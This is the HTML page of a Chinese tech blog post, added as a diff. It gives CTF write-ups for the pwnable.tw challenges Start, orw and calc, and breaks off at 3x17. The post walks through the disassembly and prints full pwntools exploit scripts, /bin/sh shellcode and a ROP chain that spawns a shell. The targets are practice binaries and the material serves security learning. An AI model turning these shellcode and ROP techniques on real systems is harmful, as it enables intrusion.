@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>haoo&#39;s tech blog - pwnable_tw</title>
+<meta name="description" content="Starthaoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ checksec start[*] &amp;#x27;/mnt/d/pwnable_tw/start&amp;#x27; Arch: i386-32-little RELRO: No RELRO Stack: No canary found N">
+<meta name="theme-color" content="#090c0b">
+<meta name="color-scheme" content="dark">
+<script>
+  (function () {
+    try {
+      var palette = localStorage.getItem('startrace-palette');
+      if (['green', 'cyan', 'amber'].includes(palette)) document.documentElement.dataset.palette = palette;
+    } catch (error) {}
+  })();
+</script>
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="alternate" type="application/rss+xml" title="haoo&#39;s tech blog RSS" href="/rss.xml">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="site-body">
+  
+  <header class="site-header">
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="site-header__inner">
+    <a class="site-brand" href="/" aria-label="haoo&#39;s tech blog 首页">
+      <span class="site-brand__mark" aria-hidden="true">0x</span>
+      <span class="site-brand__text">
+        <strong>haoo&#39;s tech blog</strong>
+      </span>
+    </a>
+
+    <nav id="site-nav" class="site-nav" aria-label="主导航">
+      
+      
+        <a class="site-nav__link" href="/">首页</a>
+      
+        <a class="site-nav__link" href="/categories">知识库</a>
+      
+        <a class="site-nav__link" href="/tags">标签</a>
+      
+        <a class="site-nav__link" href="/about">关于</a>
+      
+        <a class="site-nav__link" href="/links">链接</a>
+      
+        <a class="site-nav__link" href="/rss.xml">RSS</a>
+      
+    </nav>
+
+    <button class="command-toggle" type="button" data-command-open aria-label="打开命令行" aria-keyshortcuts="Control+K">
+      <span aria-hidden="true">&gt;_</span>
+      <span>Console</span>
+      <kbd>Ctrl K</kbd>
+    </button>
+
+    <button class="palette-toggle" type="button" data-palette-toggle aria-label="切换主题配色" title="切换主题配色">
+      <span class="palette-toggle__swatch" aria-hidden="true"></span>
+      <span data-palette-label>绿色</span>
+    </button>
+
+    <button class="menu-toggle" type="button" aria-label="打开导航" aria-expanded="false" aria-controls="site-nav">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </div>
+  <div class="reading-progress" aria-hidden="true"><span></span></div>
+</header>
+
+
+  <main id="main-content" class="site-main article-main">
+    <article class="article-wrap">
+      <header class="article-header">
+        <div class="post-meta">
+          <span>30233 字</span>
+        </div>
+        <h1>pwnable_tw</h1>
+        
+          <div class="tag-list">
+            
+              <a class="tag-chip tag-chip--solid" href="/categories/pwn/">pwn</a>
+            
+            
+              <a class="tag-chip" href="/tags/pwn/">pwn</a>
+            
+          </div>
+        
+      </header>
+
+      <div class="article-grid">
+        <div class="article-body article-prose" id="article-content">
+          <h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ checksec start<br>[*] &#x27;/mnt/d/pwnable_tw/start&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      No RELRO<br>    Stack:      No canary found<br>    NX:         NX disabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>一道32位题目，什么保护都没开，直觉就是打shellcode。在ida中发现只有start和exit函数，那就看一下汇编有什么东西</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.text:08048060                 public _start<br>.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o<br>.text:08048060                 push    esp<br>.text:08048061                 push    offset _exit<br>.text:08048066                 xor     eax, eax<br>.text:08048068                 xor     ebx, ebx<br>.text:0804806A                 xor     ecx, ecx<br>.text:0804806C                 xor     edx, edx<br>.text:0804806E                 push    &#x27;:FTC&#x27;<br>.text:08048073                 push    &#x27; eht&#x27;<br>.text:08048078                 push    &#x27; tra&#x27;<br>.text:0804807D                 push    &#x27;ts s&#x27;<br>.text:08048082                 push    2774654Ch<br>.text:08048087                 mov     ecx, esp        ; addr<br>.text:08048089                 mov     dl, 14h         ; len<br>.text:0804808B                 mov     bl, 1           ; fd<br>.text:0804808D                 mov     al, 4<br>.text:0804808F                 int     80h             ; LINUX - sys_write<br>.text:08048091                 xor     ebx, ebx<br>.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;<br>.text:08048095                 mov     al, 3<br>.text:08048097                 int     80h             ; LINUX -<br>.text:08048099                 add     esp, 14h<br>.text:0804809C                 retn<br></code></pre></td></tr></table></figure>
+
+<p>可以看出先是将几个关键的寄存器置零，输出一段字符串，接着用户输入长度为0x3C的字符串，接着平衡栈，退出程序。攻击流程就简单了，因为没有开启NX保护，我们将返回地址修改为输入shellcode的地址去执行就行了。接下来就是先泄漏地址，找一下偏移</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; cyclic -l 0x61616166<br>Finding cyclic pattern of 4 bytes: b&#x27;faaa&#x27; (hex: 0x66616161)<br>Found at offset 20<br></code></pre></td></tr></table></figure>
+
+<p>因为有输入字符串长度的限制，就在网上找一个短的shellcode就行了，有以下几个可供使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shellcode = b&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;<br>shellcode = b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;<br>或者自己写一个，32位就是eax为0xb，ebx指向/bin/sh的地址，ecx与edx为0，为了4字节对齐，这里使用//bin/sh，因为shellcode会被\x00截断，就不要出现\x00<br>shellcode = &#x27;&#x27;&#x27;<br>xor ecx,ecx<br>xor edx,edx<br>push edx ;    \x00截断字符串<br>push 0x68732f6e ;    &#x27;n/sh&#x27;<br>push 0x69622f2f ;    &#x27;//bi&#x27;<br>mov ebx,esp<br>mov al,0xb<br>int 0x80<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./start&#x27;<br>#libc_file=&#x27;&#x27;<br>#elf=ELF(&#x27;./start&#x27;)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;chall.pwnable.tw&#x27;<br>    port=10000<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = 	lambda data 				: u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>#gdb.attach(io)<br>p0 = b&quot;a&quot;*20 + p32(0x08048087)<br>sa(&quot;CTF:&quot;,p0)<br>stack = u32(io.recv(4))<br>leak(&#x27;stack&#x27;,stack)<br><br>shellcode_addr = stack + 20<br>shellcode = b&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;<br>p1 = b&quot;a&quot;*20 + p32(shellcode_addr) + shellcode<br>s(p1)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>32位打orw，直接打就行了，exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./orw&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(&#x27;./orw&#x27;)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;chall.pwnable.tw&#x27;<br>    port=10001<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = 	lambda data 				: u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>#gdb.attach(io)<br>shellcode = orw(&#x27;/home/orw/flag&#x27;,elf.bss(0x100),0x100)<br>s(shellcode)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h1 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h1><p>这是一道CVE复现的题目</p>
+<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>这是一道32位的模拟计算器的题目，实现了+、-、*、&#x2F;、%。整个流程很简单，设置了alarm(60)，然后调用calc函数，最后输出一段字符串。</p>
+<p>calc函数如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">unsigned int calc()<br>&#123;<br>  _DWORD v1[101]; // [esp+18h] [ebp-5A0h] BYREF<br>  _BYTE s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF<br>  unsigned int v3; // [esp+5ACh] [ebp-Ch]<br><br>  v3 = __readgsdword(0x14u);<br>  while ( 1 )<br>  &#123;<br>    bzero(s, 0x400u);<br>    if ( !get_expr(s, 1024) )<br>      break;<br>    init_pool(v1);<br>    if ( parse_expr(s, v1) )<br>    &#123;<br>      printf(&quot;%d\n&quot;, v1[v1[0]]);<br>      fflush(stdout);<br>    &#125;<br>  &#125;<br>  return __readgsdword(0x14u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>先是调用bzero函数先分配一段空间并置空，用于存放用户输入的算术表达式，接着进行表达式的输入（过滤了非法字符），然后又分配了一段空间，用于在后续处理表达式时存放一些数据，最后输出v1[v1[0]]的值，进行下一次循环。</p>
+<p>进入parse_expr进一步分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __cdecl parse_expr(_BYTE *p_s, _DWORD *a2)<br>&#123;<br>  int v3; // eax<br>  _BYTE *p_s_1; // [esp+20h] [ebp-88h]<br>  int i; // [esp+24h] [ebp-84h]<br>  int v6; // [esp+28h] [ebp-80h]<br>  _BYTE *v7; // [esp+2Ch] [ebp-7Ch]<br>  char *s1; // [esp+30h] [ebp-78h]<br>  int v9; // [esp+34h] [ebp-74h]<br>  _BYTE s[100]; // [esp+38h] [ebp-70h] BYREF<br>  unsigned int v11; // [esp+9Ch] [ebp-Ch]<br><br>  v11 = __readgsdword(0x14u);<br>  p_s_1 = p_s;<br>  v6 = 0;<br>  bzero(s, 0x64u);<br>  for ( i = 0; ; ++i )<br>  &#123;<br>    if ( (char)p_s[i] - (unsigned int)&#x27;0&#x27; &gt; 9 )<br>    &#123;<br>      ......<br>    &#125;<br>  &#125;<br>  while ( v6 &gt;= 0 )<br>    eval(a2, s[v6--]);<br>  return 1;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里看起来有点复杂，但其实逻辑上很简单，主要是对输入的算术表达式中每一个字符进行分析处理，如果这个字符是运算符，就进入if语句，否则就处理下一个字符，最后再进行一些运算。这里也调用了bzero函数分配了块空间，用于存放运算符。</p>
+<p>进入if语句进行分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">v7 = (_BYTE *)(&amp;p_s[i] - p_s_1);<br>s1 = (char *)malloc(v7 + 1);<br>memcpy(s1, p_s_1, v7);<br>s1[(_DWORD)v7] = 0;<br>if ( !strcmp(s1, &quot;0&quot;) )<br>&#123;<br>    puts(&quot;prevent division by zero&quot;);<br>    fflush(stdout);<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>首先是计算运算符的左侧有多少个字符，并将这些字符组成的字符串存放在一块空间里面，接着判断这段字符串不能是0，否则就退出，当然这里有个小bug，因为0只是不能当除数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">v9 = atoi(s1);<br>if ( v9 &gt; 0 )<br>&#123;<br>    v3 = (*a2)++;<br>    a2[v3 + 1] = v9;<br>&#125;<br>if ( p_s[i] &amp;&amp; (char)p_s[i + 1] - (unsigned int)&#x27;0&#x27; &gt; 9 )<br>&#123;<br>    puts(&quot;expression error!&quot;);<br>    fflush(stdout);<br>    return 0;<br>&#125;<br>p_s_1 = &amp;p_s[i + 1];<br></code></pre></td></tr></table></figure>
+
+<p>接着将运算符左边的操作数转换为整形并保存到初始化了的pool中，也就是calc函数中的v1，从代码逻辑上来看，操作数是从v1[1]开始存的，因为(*a2)++是先赋值再自增，那么v1[0]存放的应该就是当前运算数的个数。也就是说每当有操作数存入到v1中，v1[0]的值就会加1，比如如果值为1，那么就会将当前的操作数存入到v1[2]中。接着就是判断一下算术表达式是否正确，避免出现运算符后面跟着运算符的情况。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">if ( s[v6] )<br>      &#123;<br>        switch ( p_s[i] )<br>        &#123;<br>          case &#x27;%&#x27;:<br>          case &#x27;*&#x27;:<br>          case &#x27;/&#x27;:<br>            if ( s[v6] != &#x27;+&#x27; &amp;&amp; s[v6] != &#x27;-&#x27; )<br>              goto LABEL_14;<br>            s[++v6] = p_s[i];<br>            break;<br>          case &#x27;+&#x27;:<br>          case &#x27;-&#x27;:<br>LABEL_14:<br>            eval(a2, s[v6]);<br>            s[v6] = p_s[i];<br>            break;<br>          default:<br>            eval(a2, s[v6--]);<br>            break;<br>        &#125;<br>      &#125;<br>      else<br>      &#123;<br>        s[v6] = p_s[i];<br>      &#125;<br>      if ( !p_s[i] )<br>        break;<br></code></pre></td></tr></table></figure>
+
+<p>这段代码是比较关键的，首先会判断s[v6]这个位置是否存放了相应的运算符，因为首先s[]里面是没有任何东西的，因此第一次会直接将第一个运算符放入进去，当我们处理下一个运算符时，s[]里面存放着是前一个运算符，举个例子——1-2+3，当我们处理+时，s[v6]存放着-，并进行if语句里面执行相应的运算，运算结束后接着保存当前处理的运算符并等待着下一次运算。</p>
+<p>来看一下eval函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">_DWORD *__cdecl eval(_DWORD *a1, char n47)<br>&#123;<br>  _DWORD *result; // eax<br><br>  if ( n47 == &#x27;+&#x27; )<br>  &#123;<br>    a1[*a1 - 1] += a1[*a1];<br>  &#125;<br>  else if ( n47 &gt; 43 )<br>  &#123;<br>    if ( n47 == 45 )<br>    &#123;<br>      a1[*a1 - 1] -= a1[*a1];<br>    &#125;<br>    else if ( n47 == 47 )<br>    &#123;<br>      a1[*a1 - 1] /= (int)a1[*a1];<br>    &#125;<br>  &#125;<br>  else if ( n47 == 42 )<br>  &#123;<br>    a1[*a1 - 1] *= a1[*a1];<br>  &#125;<br>  result = a1;<br>  --*a1;<br>  return result;<br>&#125;<br>参数a1就是calc中的v1<br></code></pre></td></tr></table></figure>
+
+<p>可以看到计算结果会保存到第一个数的位置，也相当于v1[v1[0]-1]&#x3D;v1[1]，接着就是不断的重复不断的重复，当函数parse_expr(s, v1)结束后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.text:080493F6                 mov     eax, [ebp-5A0h]<br>.text:080493FC                 sub     1<br>.text:080493FF                 mov     eax, [ebp+eax*4-59Ch]<br>.text:08049406                 mov     [esp+4], eax<br>.text:0804940A                 mov     dword ptr [esp], offset p__d_n ; &quot;%d\n&quot;<br>.text:08049411                 call    printf<br></code></pre></td></tr></table></figure>
+
+<p>可以看出ebp-5A0h处是v1[0]，那么ebp-59Ch处就是v1[1]，最后会输出v1[v1[0]]处的值。ok，关键点就来了，在之前的分析中说到，最后输出的值会存放到v1[1]里面，而这个1是由v1[0]-1得到的，因为我们正常运算的情况下，v1[0]-1就是等于1，但是是不是可以修改v1[0]的值呢，从而达到泄漏栈上某位置的数据呢？那就来看一下v1[0]是从哪一步改变的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">v9 = atoi(s1);<br>if ( v9 &gt; 0 )<br>   &#123;<br>     v3 = (*a2)++;<br>     a2[v3 + 1] = v9;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>v1[0]的初始值为0，如果左操作数存在，那么就将操作数放入v1[v1[0]+1]处，并将v1[0]的值加1，那么问题来了，如果左操作数不存在呢，v1[0]的值在下次处理的时候还是0，当第一次进入eval函数时，就会出现一个运算符和仅有一个操作数的情况，例如+300的情况，此时v1[0]&#x3D;1、v1[1]&#x3D;300、s[0]&#x3D;+，在eval函数中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">v1[*v1-1]=v1[*v1-1]+v1[*v1]<br></code></pre></td></tr></table></figure>
+
+<p>就相当于v1[0]&#x3D;v1[0]+v1[1]&#x3D;301，最后v1[0]自减得到300，最后输出v1[300]，因为v1[0]是ebp-5A0h，就相当于输出ebp-F0h里面的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">=== Welcome to SECPROG calculator ===<br>+300<br>0<br></code></pre></td></tr></table></figure>
+
+<p>由于每次循环都会进行一次清零，所以是修改不了一定范围内的值，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">=== Welcome to SECPROG calculator ===<br>+300-20<br>-20<br>+300<br>0<br></code></pre></td></tr></table></figure>
+
+<p>所以就找一个范围外的来进行操作，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">=== Welcome to SECPROG calculator ===<br>+400<br>-2623876<br>+400-20<br>-2623896<br>+400<br>-2623896<br></code></pre></td></tr></table></figure>
+
+<p>可以看到已经修改完成了，那么接下来就来进行修改返回地址了，在上述分析中v1[0]在ebp-5A0h处，那么返回地址在v1[361]处，我们来进行泄漏</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">=== Welcome to SECPROG calculator ===<br>$ +361<br>134517913<br></code></pre></td></tr></table></figure>
+
+<p>换成16进制就是0x8049499，这个地址就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.text:08049499                 mov     dword ptr [esp], offset aMerryChristmas ; &quot;Merry Christmas!&quot;<br></code></pre></td></tr></table></figure>
+
+<p>ok，那么接下来的攻击思路就清晰了，不断构造畸形的算数表达式修改相应地址的数据，造成栈溢出，获得shell。这时候再回过头来看看这道题有什么保护机制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ checksec calc<br>[*] &#x27;/mnt/d/pwnable_tw/calc&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ file calc<br>calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped<br></code></pre></td></tr></table></figure>
+
+<p>32位静态链接程序，说明给的东西会很多，因此考虑通过ROP链构造execve(“&#x2F;bin&#x2F;sh”,0,0)从而获得shell。想达到这种效果，首先得让eax&#x3D;11,ebx&#x3D;”&#x2F;bin&#x2F;sh”的地址，ecx&#x3D;0，edx&#x3D;0，最后int 80h</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">0x0805c34b : pop eax ; ret<br>0x080701d1 : pop ecx ; pop ebx ; ret<br>0x080701aa : pop edx ; ret<br>0x08049a21: int 0x80; <br></code></pre></td></tr></table></figure>
+
+<p>接下来就是修改v1[361]至v1[370]中的值了，其他几个都好弄，比较麻烦的就&#x2F;bin&#x2F;sh字符串的地址，因为是栈上，而且到现在还没有获得到栈基址，看起来就有点难办了？并非，因为在栈里面有一个很关键的一点，当前栈帧存放着调用者的栈帧基址，可以通过当前的ebp来寻找，因此在这道题里面，可以找到main的栈基址，再找到main函数与calc的关系就可以获得calc的栈基址了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; x/8wx $ebp<br>0xfff5cfb8:     0xfff5cfd8<br></code></pre></td></tr></table></figure>
+
+<p>通过调试可以知道，其相差0x20，因此泄漏的ebp-0x20+4就是ROP链开始的地方，接着再加上相应的偏移就是&#x2F;bin&#x2F;sh的地址了。借鉴了一下其他师傅的exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) #log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./calc&#x27;<br>#libc_file=&#x27;&#x27;<br>#elf=ELF(&#x27;./start&#x27;)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=1<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;chall.pwnable.tw&#x27;<br>    port=10100<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br><br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uu64    = 	lambda data 				: u64(data.ljust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br><br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>pop_eax_ret = 0x0805c34b<br>pop_ecx_pop_ebx_ret = 0x080701d1<br>pop_edx_ret = 0x080701aa<br>int_80 = 0x08049a21<br><br>ebp_offest = int(0x5A0/4)<br>rop_addr_offset = ebp_offest+1<br><br>io.recv()<br>sl(&quot;+&quot;+str(ebp_offest))<br>saved_ebp = int(io.recvline().strip())<br><br>payload = [pop_eax_ret,0xb]<br>payload += [pop_edx_ret,0]<br>payload += [pop_ecx_pop_ebx_ret,0,0]<br>payload += [int_80]<br>bin_sh_addr = saved_ebp - 0x20 + len(payload)*4 + 4<br><br>payload[6] = bin_sh_addr<br>payload += [0x6e69622f, 0x0068732f]<br><br>for i in range(len(payload)):<br>    io.sendline(&quot;+&quot; + str(rop_addr_offset + i))<br>    val = int(io.recvline().strip())<br>    offset = payload[i] - val<br>    if offset &lt; 0:<br>        io.sendline(&quot;+&quot; + str(rop_addr_offset + i) + str(offset))<br>    else:<br>        io.sendline(&quot;+&quot; + str(rop_addr_offset + i) + &quot;+&quot; + str(offset))<br>    io.recv()<br>io.sendline()<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h1 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ checksec 3x17<br>[*] &#x27;/mnt/d/pwnable_tw/3x17&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>haoo@LAPTOP-QH6DKIQF:/mnt/d/pwnable_tw$ file 3x17<br>3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped<br></code></pre></td></tr></table></figure>
+
